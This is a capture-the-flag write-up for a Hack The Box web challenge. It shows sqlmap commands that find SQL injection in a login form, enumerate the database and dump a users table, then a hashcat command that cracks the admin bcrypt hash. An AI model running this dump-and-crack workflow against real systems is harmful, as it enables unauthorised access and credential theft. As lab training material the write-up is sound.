<h1 style="color:blue;">KORP Terminal challenge</h1>

Platform: Hack The Box

Author: 0xL0m4

Category: Web (Very Easy)


<img width="1550" height="173" alt="image" src="https://github.com/user-attachments/assets/1cb94b9f-44d1-411e-807a-2315552b01c9" />


## Challenge Description:
Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.


## Tools Used

  - Burp Suite
  - sqlmap
  - Hashcat


## Steps:

### 1. Open the website and analyze the application

After opening the website, I found a login page.

I started by reviewing the source code to search for any leaked credentials or sensitive information, but nothing useful was found.

Since the application uses a login form, the next step was to test for SQL Injection.


### 2. Testing for SQL Injection

I intercepted the login request using Burp Suite and saved the request into a file: request.txt

Then, I used SQLmap to test the request:

```
sqlmap -r request.txt
```

The response returned a 401 Unauthorized status code, so I used the --ignore-code option to ignore this response:
```
sqlmap -r request.txt --ignore-code 401
```

SQLmap confirmed that the username parameter was vulnerable to SQL Injection.

### 3. Enumerating databases

Now, we can enumerate the available databases:
```
sqlmap -r request.txt --ignore-code 401 --dbs
```

The result showed databases, including:

```
korp_terminal
```

let's enumerate its tables.


### 4. Enumerating tables

Using:

```
sqlmap -r request.txt --ignore-code 401 -D korp_terminal --tables
```

We discovered a table:
```
users
```

### 5. Dumping users table

Now, let's dump the contents of the users table:
```
sqlmap -r request.txt --ignore-code 401 -D korp_terminal -T users --dump
```

The output revealed an admin password hash stored using bcrypt:
```
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
```

### 6. Cracking the bcrypt hash

Since the hash uses bcrypt, we can use Hashcat with mode 3200:
```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

The password was successfully cracked:
```
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

### 7. Login as admin

Now we can login using:

```
Username: admin
Password: password123
```

Voilaaaa!!

The flag was successfully retrieved.

#

[The challenge link](https://app.hackthebox.com/challenges/KORP%2520Terminal?tab=play_challenge)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
